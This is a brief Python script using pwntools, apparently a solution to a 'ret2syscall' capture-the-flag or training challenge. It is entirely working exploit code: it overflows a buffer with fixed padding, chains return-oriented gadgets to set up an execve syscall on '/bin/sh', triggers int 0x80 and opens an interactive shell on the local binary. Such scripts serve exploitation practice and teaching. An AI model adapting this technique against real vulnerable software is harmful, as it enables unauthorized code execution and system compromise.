from pwn import *
pop_eax_ret = 0x080bb196
pop_ecx_ebx_ret = 0x0806eb91
pop_edx_ret = 0x0806eb6a
int_80 = 0x08049421
bin_sh = 0x080be408
offset = 0x6c + 4
payload = (offset * b'A' +
           p32(pop_eax_ret) + p32(0x0b) +
           p32(pop_ecx_ebx_ret) + p32(0) + p32(bin_sh) +
           p32(pop_edx_ret) + p32(0) +
           p32(int_80))
sh = process('./ret2syscall')
sh.sendline(payload)
sh.interactive()
